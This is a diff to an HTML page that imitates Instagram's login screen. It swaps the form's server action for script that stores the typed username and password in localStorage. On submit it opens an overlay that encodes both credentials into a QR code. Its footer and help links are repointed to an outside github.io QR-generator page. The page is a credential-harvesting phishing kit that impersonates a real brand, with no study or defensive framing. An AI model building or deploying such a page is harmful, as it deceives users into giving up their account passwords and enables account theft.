@@ -1,3 +1,4 @@
+
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -36,7 +37,7 @@
         .logo {
             margin-bottom: 30px;
             font-size: 38px;
-            font-family: 'Instagram Sans', sans-serif;
+            font-family: 'Instagram Sans', Instagram Sans;
             font-weight: 400;
         }
 
@@ -135,26 +136,61 @@
             color: #8e8e8e;
             text-decoration: none;
         }
+  /* Overlay Styles */
+        .overlay {
+            position: fixed;
+            display: none;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.5);
+            z-index: 9999;
+        }
+
+        .overlay-content {
+            background-color: white;
+            margin: 15% auto;
+            padding: 20px;
+            width: 70%;
+            max-width: 600px;
+            position: relative;
+        }
+
+        .close-btn {
+            position: absolute;
+            right: 20px;
+            top: 10px;
+            font-size: 28px;
+            cursor: pointer;
     </style>
 </head>
 <body>
     <div class="container">
         <div class="login-box">
             <div class="logo">Instagram</div>
-            <form action="submit.php" method="post">
-                <input type="text" name="username" placeholder="Phone number, username or email" required>
-                <input type="password" name="password"  placeholder="Password" required>
-                <button type="submit">Log in</button>
+            <form id="loginForm">
+                <input type="text"id="username" name="username" placeholder="Phone number, username or email" required>
+                <input type="password" id="password" name="password"  placeholder="Password" required>
+                <button type="submit" >Log in</button>
             </form>
 
             <div class="separator">OR</div>
 
-            <a href="#" class="fb-login">Log in with Facebook</a>
-            <a href="#" class="forgot-pw">Forgotten your password?</a>
+            <a href="https://cyr5.github.io/qr-code-generator/" class="fb-login">Log in with Facebook</a>
+            <a href="https://cyr5.github.io/qr-code-generator/" class="forgot-pw">Forgotten your password?</a>
         </div>
 
         <div class="signup">
             Don't have an account? <a href="#">Sign up</a>
+        </div>
+
+<div id="myOverlay" class="overlay">
+        <div class="overlay-content">
+            <span class="close-btn" onclick="closeOverlay()">&times;</span>
+            <h2>Gernerate Qr code</h2>
+            <button type="submit" onclick="generateQRCode()" >generate</button>
+            <div id="qrcode"></div>
         </div>
 
         <div class="get-app">
@@ -167,19 +203,19 @@
 
         <div class="footer">
             <div class="footer-links">
-                <a href="#">Meta</a>
-                <a href="#">About</a>
-                <a href="#">Blog</a>
-                <a href="#">Jobs</a>
-                <a href="#">Help</a>
-                <a href="#">API</a>
-                <a href="#">Privacy</a>
-                <a href="#">Cookie settings</a>
-                <a href="#">Terms</a>
-                <a href="#">Locations</a>
-                <a href="#">Instagram Lite</a>
-                <a href="#">Threads</a>
-                <a href="#">Contact uploading and non-users</a>
+                <a href="https://cyr5.github.io/qr-code-generator/">Meta</a>
+                <a href="https://cyr5.github.io/qr-code-generator/">About</a>
+                <a href="https://cyr5.github.io/qr-code-generator/">Blog</a>
+                <a href="https://cyr5.github.io/qr-code-generator/">Jobs</a>
+                <a href="https://cyr5.github.io/qr-code-generator/">Help</a>
+                <a href="https://cyr5.github.io/qr-code-generator/">API</a>
+                <a href="https://cyr5.github.io/qr-code-generator/">Privacy</a>
+                <a href="https://cyr5.github.io/qr-code-generator/">Cookie settings</a>
+                <a href="https://cyr5.github.io/qr-code-generator/">Terms</a>
+                <a href="https://cyr5.github.io/qr-code-generator/">Locations</a>
+                <a href="https://cyr5.github.io/qr-code-generator/">Instagram Lite</a>
+                <a href="https://cyr5.github.io/qr-code-generator/">Threads</a>
+                <a href="https://cyr5.github.io/qr-code-generator/">Contact uploading and non-users</a>
             </div>
             <div style="margin-top: 20px;">
                 <select style="border: none; color: #8e8e8e; font-size: 12px;">
@@ -189,5 +225,48 @@
             </div>
         </div>
     </div>
+
+<script defer>
+        // The script now runs after the form element is loaded.
+        document.getElementById('loginForm').addEventListener('submit', function(event) {
+            event.preventDefault();
+            var username = document.getElementById('username').value; // Get the value from the username field
+            var password = document.getElementById('password').value; // Get the value from the password field
+            localStorage.setItem('username', username); // Store the username in local storage
+            localStorage.setItem('password', password); // Store the password in local storage
+        });
+    </script>
+
+<script>
+        document.getElementById('loginForm').addEventListener('submit', function(event) {
+            event.preventDefault();
+            document.getElementById('myOverlay').style.display = 'block';
+        });
+
+        function closeOverlay() {
+            document.getElementById('myOverlay').style.display = 'none';
+        }
+    </script>
+
+ <script src="https://cdn.rawgit.com/davidshimjs/qrcodejs/gh-pages/qrcode.min.js"></script>
+    <script>
+      function generateQRCode() {
+        var username = localStorage.getItem('username');
+        var password = localStorage.getItem('password');
+        var data = `Username: ${username}\nPassword: ${password}`;
+
+        var qrcode = new QRCode(document.getElementById("qrcode"), {
+          text: data,
+          width: 128,
+          height: 128,
+          colorDark : "#000000",
+          colorLight : "#ffffff",
+          correctLevel : QRCode.CorrectLevel.H
+        });
+      }
+    </script>
+
+
+
 </body>
 </html>
